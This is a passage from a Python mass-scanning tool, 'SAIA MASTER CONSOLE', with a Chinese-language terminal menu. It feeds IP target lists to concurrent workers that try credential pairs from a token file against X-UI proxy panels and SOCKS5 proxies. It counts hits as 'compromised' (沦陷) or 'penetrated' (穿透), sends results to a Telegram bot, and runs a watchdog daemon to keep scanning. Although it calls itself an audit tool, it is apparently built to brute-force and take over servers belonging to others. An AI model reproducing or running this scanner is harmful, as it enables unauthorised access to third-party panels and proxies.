            f"最近:\n" + ("\n".join(recent_lines) if recent_lines else "-")
        )

    async def flush_state_loop():
        nonlocal last_interval_push_ts
        last_checkpoint_ts = 0.0
        while not flush_stop.is_set():
            await asyncio.sleep(STATE_FLUSH_INTERVAL)
            now = now_ts()
            should_send_interval = False
            snapshot = None
            recent_lines = []
            async with state_lock:
                save_state(STATE_FILE, state)
                if (
                    resume_enabled
                    and now - last_checkpoint_ts >= CHECKPOINT_FLUSH_INTERVAL
                ):
                    save_state(
                        CHECKPOINT_FILE,
                        {
                            "session_key": session_key,
                            "updated_at": now,
                            "done_targets": sorted(done_targets),
                            "done": state.get("done", 0),
                            "total": state.get("total", 0),
                        },
                    )
                    last_checkpoint_ts = now
                if (
                    tg_enabled
                    and tg_interval_sec > 0
                    and now - last_interval_push_ts >= tg_interval_sec
                    and state.get("total", 0) > 0
                ):
                    should_send_interval = True
                    snapshot = {
                        "done": state.get("done", 0),
                        "total": state.get("total", 0),
                        "xui_found": state.get("xui_found", 0),
                        "xui_verified": state.get("xui_verified", 0),
                        "s5_found": state.get("s5_found", 0),
                        "s5_verified": state.get("s5_verified", 0),
                    }
                    recent_lines = list(state.get("recent", []))[-5:]
            if should_send_interval:
                last_interval_push_ts = now
                schedule_telegram(build_interval_message(snapshot, recent_lines))

    async def adaptive_conn_loop():
        current_limit = socket_limit
        while not flush_stop.is_set():
            await asyncio.sleep(ADAPT_CHECK_INTERVAL)
            mem_mb = get_available_memory_mb()
            queue_size = q.qsize()
            next_limit = current_limit

            if mem_mb is not None and mem_mb < ADAPT_LOW_MB:
                next_limit = max(adaptive_min, current_limit - ADAPT_STEP_DOWN)
            elif mem_mb is not None and mem_mb > ADAPT_HIGH_MB and queue_size > 0:
                next_limit = min(adaptive_max, current_limit + ADAPT_STEP_UP)

            if next_limit != current_limit:
                await conn_limiter.set_capacity(next_limit)
                current_limit = next_limit

            cap, in_use = await conn_limiter.snapshot()
            async with state_lock:
                state["socket_limit"] = cap
                state["socket_in_use"] = in_use
                state["free_mb"] = round(mem_mb, 1) if mem_mb is not None else None

    flusher = asyncio.create_task(flush_state_loop())
    adaptive_task = asyncio.create_task(adaptive_conn_loop())

    tokens = []
    token_file = resolve_token_file()
    if token_file:
        with open(token_file, "r", encoding="utf-8", errors="ignore") as f:
            for l in f:
                l = l.strip()
                if l:
                    tokens.append(l.split(":", 1) if ":" in l else ["admin", l])

    async def worker():
        nonlocal special_or_sent
        while True:
            ip = await q.get()
            if ip is None:
                q.task_done()
                break
            active_started = False
            try:
                async with state_lock:
                    state["current"] = f"Auditing -> {ip}"
                    state["active_workers"] = state.get("active_workers", 0) + 1
                    active_started = True

                async def handle_found_results(found_res):
                    if not found_res:
                        return
                    async with state_lock:
                        for r in found_res:
                            state["recent"] = (state["recent"] + [r])[-6:]
                    for r in found_res:
                        append_rotating(
                            REPORT_FILE,
                            r + "\n",
                            MAX_REPORT_BYTES,
                            REPORT_BACKUPS,
                        )
                    if tg_enabled and tg_condition_mode in (1, 2, 3):
                        matched = [r for r in found_res if should_push_condition(r)]
                        if matched:
                            schedule_telegram(
                                "SAIA 条件命中推送\n" + "\n".join(matched)
                            )

                if mode in (1, 3):
                    for p in xui_ports:
                        x_r = await audit_xui(
                            ip, p, tokens, state, state_lock, work_mode, conn_limiter
                        )
                        if x_r:
                            await handle_found_results([x_r])
                            break

                if mode in (2, 3):
                    for p in s5_ports:
                        s_r = await audit_socks5(
                            ip, p, tokens, state, state_lock, work_mode, conn_limiter
                        )
                        if s_r:
                            await handle_found_results([s_r])
                            break
                async with state_lock:
                    state["done"] += 1
                    state["current"] = f"Completed -> {ip}"
                    if resume_enabled:
                        done_targets.add(ip)
                    need_special_or_push = (
                        tg_enabled
                        and tg_condition_mode == 4
                        and not special_or_sent
                        and (
                            state.get("xui_verified", 0) + state.get("s5_verified", 0)
                            >= tg_verified_threshold
                        )
                    )
                    if need_special_or_push:
                        special_or_sent = True
                        special_snapshot = {
                            "done": state.get("done", 0),
                            "total": state.get("total", 0),
                            "xui_found": state.get("xui_found", 0),
                            "xui_verified": state.get("xui_verified", 0),
                            "s5_found": state.get("s5_found", 0),
                            "s5_verified": state.get("s5_verified", 0),
                        }
                        special_recent = list(state.get("recent", []))[-5:]
                    else:
                        special_snapshot = None
                        special_recent = []
                if special_snapshot is not None:
                    schedule_telegram(
                        "SAIA 触发推送: 验真数量达到阈值\n"
                        + build_interval_message(special_snapshot, special_recent)
                    )
            finally:
                if active_started:
                    async with state_lock:
                        state["active_workers"] = max(
                            0, state.get("active_workers", 0) - 1
                        )
                q.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(threads)]
    node_files = resolve_node_files()
    if not node_files:
        state["status"] = "completed"
        flush_stop.set()
        await asyncio.gather(flusher, adaptive_task, return_exceptions=True)
        save_state(STATE_FILE, state)
        return

    seen_targets = set()
    skipped_by_resume = 0
    try:
        for node_file in node_files:
            with open(node_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    for raw_target in line.split():
                        expanded, truncated = expand_target_entry(raw_target)
                        if truncated:
                            log_event(
                                f"Target entry truncated: {raw_target} -> first {MAX_EXPANDED_TARGETS_PER_ENTRY}"
                            )
                        for target in expanded:
                            if target in seen_targets:
                                continue
                            seen_targets.add(target)
                            async with state_lock:
                                state["total"] += 1
                            if resume_enabled and target in done_targets:
                                skipped_by_resume += 1
                                async with state_lock:
                                    state["done"] += 1
                                    state["current"] = f"Resume skip -> {target}"
                                continue
                            async with state_lock:
                                state["current"] = f"Feeding target -> {target}"
                            await q.put(target)
                            await asyncio.sleep(feed_int)
    except OSError:
        pass

    if skipped_by_resume > 0:
        log_event(f"Resume restored {skipped_by_resume} completed targets")

    for _ in range(threads):
        await q.put(None)
    await asyncio.gather(*workers)
    state["status"] = "completed"
    state["current"] = "Completed"
    if tg_enabled:
        final_snapshot = {
            "done": state.get("done", 0),
            "total": state.get("total", 0),
            "xui_found": state.get("xui_found", 0),
            "xui_verified": state.get("xui_verified", 0),
            "s5_found": state.get("s5_found", 0),
            "s5_verified": state.get("s5_verified", 0),
        }
        final_recent = list(state.get("recent", []))[-5:]
        if tg_condition_mode == 4:
            if not special_or_sent:
                schedule_telegram(
                    "SAIA 触发推送: 全部 IP 审计完成\n"
                    + build_interval_message(final_snapshot, final_recent)
                )
        else:
            schedule_telegram(build_interval_message(final_snapshot, final_recent))
    flush_stop.set()
    await asyncio.gather(flusher, adaptive_task, return_exceptions=True)
    if notify_tasks:
        await asyncio.gather(*list(notify_tasks), return_exceptions=True)
    if state.get("done", 0) >= state.get("total", 0):
        clear_checkpoint()
    save_state(STATE_FILE, state)


# ==================== 管理界面 (极光UI版) ====================


def main_console():
    # 动态加载旋转图标
    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    spin_idx = 0
    panel_inner = 74

    def visible_width(text):
        clean = re.sub(r"\x1b\[[0-9;]*m", "", text)
        width = 0
        for ch in clean:
            if unicodedata.combining(ch):
                continue
            if unicodedata.east_asian_width(ch) in ("W", "F"):
                width += 2
            else:
                width += 1
        return width

    def panel_line(text):
        pad = max(0, panel_inner - 1 - visible_width(text))
        return f"{C_BLUE}┃ {text}{' ' * pad}{C_BLUE}┃{C_W}"

    while True:
        os.system("cls" if os.name == "nt" else "clear")
        s = load_state(STATE_FILE)
        g = load_state(GUARDIAN_STATE_FILE)
        resume_cfg = load_resume_config()
        tg_cfg = load_telegram_config()
        p_status = (
            f"{C_SUCC}ON{C_BLUE}" if is_alive(s.get("pid")) else f"{C_DIM}OFF{C_BLUE}"
        )
        g_status = (
            f"{C_SUCC}ON{C_BLUE}" if is_alive(g.get("pid")) else f"{C_DIM}OFF{C_BLUE}"
        )
        xui_audited = int(s.get("xui_found", 0))
        s5_audited = int(s.get("s5_found", 0))
        xui_verified = int(s.get("xui_verified", 0))
        s5_verified = int(s.get("s5_verified", 0))
        done = int(s.get("done", 0))
        total = int(s.get("total", 0))
        active_workers = int(s.get("active_workers", 0))
        socket_limit = int(s.get("socket_limit", 0))
        socket_in_use = int(s.get("socket_in_use", 0))
        current = str(s.get("current", "-"))
        if len(current) > 62:
            current = current[:62] + "..."
        local_free_mb = get_available_memory_mb()
        local_total_mb = get_total_memory_mb()
        local_cpu = get_cpu_usage_percent()
        mem_text = "-"
        if (
            isinstance(local_free_mb, (int, float))
            and isinstance(local_total_mb, (int, float))
            and local_total_mb > 0
        ):
            used_pct = max(
                0.0, min(100.0, (1.0 - local_free_mb / local_total_mb) * 100.0)
            )
            mem_text = f"{local_free_mb:.0f}/{local_total_mb:.0f}MB({used_pct:.1f}%)"
        elif isinstance(local_free_mb, (int, float)):
            mem_text = f"Free {local_free_mb:.0f}MB"
        cpu_text = f"{local_cpu:.1f}%" if isinstance(local_cpu, (int, float)) else "-"
        work_mode_text = work_mode_label(s.get("work_mode", 2))
        resume_status = (
            f"{C_SUCC}ON{C_BLUE}"
            if resume_cfg.get("enabled", True)
            else f"{C_DIM}OFF{C_BLUE}"
        )
        tg_status = (
            f"{C_SUCC}ON{C_BLUE}"
            if tg_cfg.get("enabled")
            and tg_cfg.get("bot_token")
            and tg_cfg.get("chat_id")
            else f"{C_DIM}OFF{C_BLUE}"
        )

        # 极光面板头部
        print(
            f"{C_BLUE}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C_W}"
        )
        print(
            panel_line(f"{C_BOLD}SAIA MASTER CONSOLE v23.5{C_W} | {C_CYAN}旗舰穿透版")
        )
        print(
            f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
        )
        print(
            panel_line(
                f"{C_W}审计引擎:{p_status} {C_BLUE}| {C_W}自启守护:{g_status} {C_BLUE}| {C_W}断点续连:{resume_status} {C_BLUE}| {C_W}Telegram:{tg_status}"
            )
        )
        print(
            panel_line(
                f"{C_W}进度:{C_CYAN}{done}{C_W}/{total} {C_BLUE}| {C_W}并行:{C_CYAN}{active_workers}{C_W} {C_BLUE}| {C_W}工作模式:{C_CYAN}{work_mode_text}"
            )
        )
        print(
            panel_line(
                f"{C_W}XUI 已审计:{C_CYAN}{xui_audited}{C_W} / 已验真:{C_WARN}{xui_verified}{C_W} {C_BLUE}| {C_W}S5 已审计:{C_CYAN}{s5_audited}{C_W} / 已验真:{C_SUCC}{s5_verified}"
            )
        )
        print(
            panel_line(
                f"{C_W}Socket:{C_CYAN}{socket_in_use}{C_W}/{socket_limit} {C_BLUE}| {C_W}CPU:{C_CYAN}{cpu_text}{C_W} {C_BLUE}| {C_W}内存:{C_CYAN}{mem_text}{C_W}"
            )
        )
        print(panel_line(f"{C_W}当前:{C_DIM}{current}{C_W}"))
        print(
            f"{C_BLUE}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C_W}"
        )

        print(f"\n{C_CYAN} [ 核心指令 ]{C_W}")
        print(f" 1) 启动审计  5) 停止审计  9) 退出系统")
        print(f" 2) 监控面板  6) 启动守护")
        print(f" 3) 查看结果  10) Telegram推送")
        print(f" 4) 查看日志  8) 停止守护")
        print(f" 7) 断点续连  11) 查看(发现)")

        c = input(
            f"\n{C_BLUE}┌──({C_W}root@saia{C_BLUE})-[{C_W}~/menu{C_BLUE}]\n└─{C_WARN}# {C_W}"
        ).strip()

        if c == "1":
            print(f"\n{C_CYAN}>>> 配置审计参数{C_W}")
            m = prompt_int(
                "模式 (1.XUI / 2.S5 / 3.全能): ", default=3, min_value=1, max_value=3
            )
            wm = prompt_int(
                "深度 (1.探索 / 2.探索+验真 / 3.只留极品): ",
                default=2,
                min_value=1,
                max_value=3,
            )
            th = prompt_int(
                "线程 (建议 50-300): ", default=20, min_value=1, max_value=1000
            )
            default_ports = (
                DEFAULT_XUI_PORTS
                if m == 1
                else DEFAULT_S5_PORTS
                if m == 2
                else DEFAULT_MIXED_PORTS
            )
            ps = input(f"端口 (默认 {default_ports[:20]}...): ") or default_ports
            if not parse_ports(ps):
                print("端口无效")
                time.sleep(1)
                continue
            subprocess.Popen(
                [sys.executable, __file__, "run", str(m), str(wm), str(th), ps, "0.02"],
                start_new_session=True,
            )
            print(f"{C_SUCC}>>> 核心已启动!{C_W}")
            time.sleep(1)

        elif c == "2":
            try:
                while True:
                    st = load_state(STATE_FILE)
                    done = st.get("done", 0)
                    total = st.get("total", 0)
                    bar = render_progress_bar(done, total)
                    spin_char = spinner[spin_idx % len(spinner)]
                    spin_idx += 1

                    os.system("cls" if os.name == "nt" else "clear")
                    # 极光监控仪表盘
                    print(
                        f"{C_BLUE}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C_W}"
                    )
                    print(
                        f"{C_BLUE}┃ {C_W}{spin_char} {C_BOLD}REAL-TIME MONITOR{C_W}       | {C_DIM}Mode: {work_mode_label(st.get('work_mode', 2))}{C_BLUE}       ┃{C_W}"
                    )
                    print(
                        f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
                    )
                    # XUI 行 (去除高光，统一对齐)
                    print(
                        f"{C_BLUE}┃ {C_W}X-UI 面板  {C_BLUE}|{C_W} 发现: {C_CYAN}{st.get('xui_found', 0):<6}{C_W} | 沦陷: {C_WARN}{st.get('xui_verified', 0):<6}{C_BLUE} ┃{C_W}"
                    )
                    # S5 行 (去除高光，统一对齐)
                    print(
                        f"{C_BLUE}┃ {C_W}SOCKS5代理 {C_BLUE}|{C_W} 连通: {C_CYAN}{st.get('s5_found', 0):<6}{C_W} | 穿透: {C_SUCC}{st.get('s5_verified', 0):<6}{C_BLUE} ┃{C_W}"
                    )
                    print(
                        f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
                    )
                    print(
                        f"{C_BLUE}┃ {C_W}当前动作   {C_BLUE}|{C_DIM} {st.get('current', '-')[:24]:<24} 并行:{st.get('active_workers', 0):<4} {C_BLUE}┃{C_W}"
                    )
                    print(
                        f"{C_BLUE}┃ {C_W}总体进度   {C_BLUE}|{C_W} {bar} {C_BLUE}┃{C_W}"
                    )
                    print(
                        f"{C_BLUE}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C_W}"
                    )
                    print(f"\n{C_DIM}按 Ctrl+C 返回主菜单...{C_W}")
                    time.sleep(0.5)
            except KeyboardInterrupt:
                pass

        elif c == "3":
            output = read_last_lines(REPORT_FILE, lines=50)
            print(f"\n{C_CYAN}>>> 最近 50 条结果{C_W}\n")
            print(output if output else f"{C_DIM}暂无数据{C_W}")
            input(f"\n{C_BLUE}按回车返回...{C_W}")

        elif c == "4":
            output = read_last_lines(LOG_FILE, lines=50)
            print(f"\n{C_CYAN}>>> 系统日志{C_W}\n")
            print(output if output else f"{C_DIM}暂无日志{C_W}")
            input(f"\n{C_BLUE}按回车返回...{C_W}")

        elif c == "5":
            pid = load_state(STATE_FILE).get("pid")
            if stop_process(pid):
                print(f"{C_WARN}>>> 审计任务已强制停止{C_W}")
            else:
                print(f"{C_DIM}没有运行中的任务{C_W}")
            time.sleep(1)

        elif c == "6":
            # 守护进程启动逻辑 (保持不变)
            m = prompt_int("守护模式 (3): ", default=3, min_value=1, max_value=3)
            th = prompt_int("守护线程 (10): ", default=10, min_value=1, max_value=1000)
            default_ports = (
                DEFAULT_XUI_PORTS
                if m == 1
                else DEFAULT_S5_PORTS
                if m == 2
                else DEFAULT_MIXED_PORTS
            )
            ps = input(f"端口 (默认 {default_ports[:20]}...): ") or default_ports
            if not parse_ports(ps):
                print("端口无效")
                time.sleep(1)
                continue
            subprocess.Popen(
                [
                    sys.executable,
                    __file__,
                    "guardian",
                    str(m),
                    "2",
                    str(th),
                    ps,
                    "0.05",
                    "20",
                    "256",
                ],
                start_new_session=True,
            )
            print(f"{C_SUCC}>>> 守护进程已启动{C_W}")
            time.sleep(1)

        elif c == "7":
            rcfg = load_resume_config()
            print(f"\n{C_CYAN}>>> 断点续连配置{C_W}")
            print(f"当前状态: {'启用' if rcfg.get('enabled', True) else '关闭'}")
            print("1) 开启  2) 关闭  3) 清空断点")
            sel = input("请选择 (默认回车返回): ").strip()
            if sel == "1":
                rcfg["enabled"] = True
                save_resume_config(rcfg)
                print(f"{C_SUCC}>>> 已开启断点续连{C_W}")
            elif sel == "2":
                rcfg["enabled"] = False
                save_resume_config(rcfg)
                print(f"{C_WARN}>>> 已关闭断点续连{C_W}")
            elif sel == "3":
                clear_checkpoint()
                print(f"{C_SUCC}>>> 断点记录已清空{C_W}")
            time.sleep(1)

        elif c == "10":
            cfg = load_telegram_config()
            print(f"\n{C_CYAN}>>> Telegram 推送配置{C_W}")
            print(
                f"当前状态: {'启用' if cfg.get('enabled') else '关闭'} | 条件: {telegram_condition_label(cfg.get('condition_mode', 2))} | 定时: {cfg.get('interval_minutes', 0)} 分钟 | 验真阈值: {cfg.get('verified_threshold', 5)}"
            )
            print("留空表示保持当前值")
            token = input("Bot Token: ").strip()
            chat_id = input("Chat ID: ").strip()
            en_raw = input("启用推送? (y/n, 默认保持): ").strip().lower()
            interval_raw = input("定时推送间隔分钟 (0=关闭, 默认保持): ").strip()
            cond_raw = input(
                "条件推送 (0关闭/1发现即推/2仅验真/3发现+验真/4完成或验真>=阈值(单次), 默认保持): "
            ).strip()
            th_raw = input("验真阈值 (默认5, 仅模式4生效, 默认保持): ").strip()
            test_raw = input("保存后发送测试消息? (y/n): ").strip().lower()

            if token:
                cfg["bot_token"] = token
            if chat_id:
                cfg["chat_id"] = chat_id
            if en_raw in ("y", "n"):
                cfg["enabled"] = en_raw == "y"
            if interval_raw:
                try:
                    cfg["interval_minutes"] = max(0, int(interval_raw))
                except ValueError:
                    print("间隔输入无效，保持原值")
            if cond_raw:
                try:
                    cond_mode = int(cond_raw)
                    if cond_mode in (0, 1, 2, 3, 4):
                        cfg["condition_mode"] = cond_mode
                    else:
                        print("条件模式无效，保持原值")
                except ValueError:
                    print("条件输入无效，保持原值")
            if th_raw:
                try:
                    cfg["verified_threshold"] = max(1, int(th_raw))
                except ValueError:
                    print("阈值输入无效，保持原值")

            save_telegram_config(cfg)
            print(f"{C_SUCC}>>> Telegram 配置已保存{C_W}")
            if test_raw == "y":
                ok, detail = send_telegram_message(
                    cfg.get("bot_token", ""),
                    cfg.get("chat_id", ""),
                    "SAIA 测试消息: Telegram 推送配置已生效。",
                )
                if ok:
                    print(f"{C_SUCC}>>> 测试消息发送成功{C_W}")
                else:
                    print(f"{C_WARN}>>> 测试消息发送失败: {detail}{C_W}")
            time.sleep(1)

        elif c == "8":
            gpid = load_state(GUARDIAN_STATE_FILE).get("pid")
            if stop_process(gpid):
                print(f"{C_WARN}>>> 守护进程已停止{C_W}")
            else:
                print(f"{C_DIM}没有运行中的守护{C_W}")
            time.sleep(1)

        elif c == "9":
            break
        elif c == "11":
            found_output = read_last_lines(
                REPORT_FILE,
                lines=200,
                filter_keywords=[
                    "存活",
                    "连通",
                    "加密节点",
                    "发现成功",
                    "Asset[X-UI]",
                    "Node[S5",
                ],
            )
            s5_output = read_last_lines(
                REPORT_FILE,
                lines=200,
                filter_keywords=["Node[S5", "S5-OPEN", "S5-AUTH", "连通", "加密节点"],
            )
            verified_output = read_last_lines(
                REPORT_FILE,
                lines=200,
                filter_keywords=["沦陷", "真穿透", "验证成功", "认证通过"],
            )

            print(f"\n{C_CYAN}>>> 发现资产列表 (存活/连通){C_W}\n")
            print(found_output if found_output else f"{C_DIM}暂无发现数据{C_W}")
            print(f"\n{C_CYAN}>>> S5 资产列表{C_W}\n")
            print(s5_output if s5_output else f"{C_DIM}暂无S5资产数据{C_W}")
            print(f"\n{C_CYAN}>>> 验真结果 (真实可用){C_W}\n")
            print(verified_output if verified_output else f"{C_DIM}暂无验真数据{C_W}")
            input(f"\n{C_BLUE}按回车返回...{C_W}")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "run":
        # ... (参数解析逻辑保持一致)
        if len(sys.argv) < 7:
            raise SystemExit("参数不足")
        mode, work_mode, threads = int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
        ports, feed_int = parse_ports(sys.argv[5]), float(sys.argv[6])
        if (
            mode not in (1, 2, 3)
            or work_mode not in (1, 2, 3)
            or threads < 1
            or not ports
            or feed_int < 0
        ):
            raise SystemExit("Err")
        asyncio.run(internal_audit_process(mode, work_mode, threads, ports, feed_int))
    elif len(sys.argv) > 1 and sys.argv[1] == "guardian":
        # ... (参数解析逻辑保持一致)
        if len(sys.argv) < 6:
            raise SystemExit("参数不足")
        try:
            mode, work_mode, threads, ports_str = (
                int(sys.argv[2]),
                int(sys.argv[3]),
                int(sys.argv[4]),
                sys.argv[5],
            )
            feed_int = float(sys.argv[6]) if len(sys.argv) > 6 else 0.05
            check_interval = float(sys.argv[7]) if len(sys.argv) > 7 else 20.0
            min_free_mb = float(sys.argv[8]) if len(sys.argv) > 8 else 256.0
            run_guardian(
                mode,
                work_mode,
                threads,
                ports_str,
                feed_int,
                check_interval,
                min_free_mb,
            )
        except ValueError:
            raise SystemExit("Err")
    else:
        main_console()
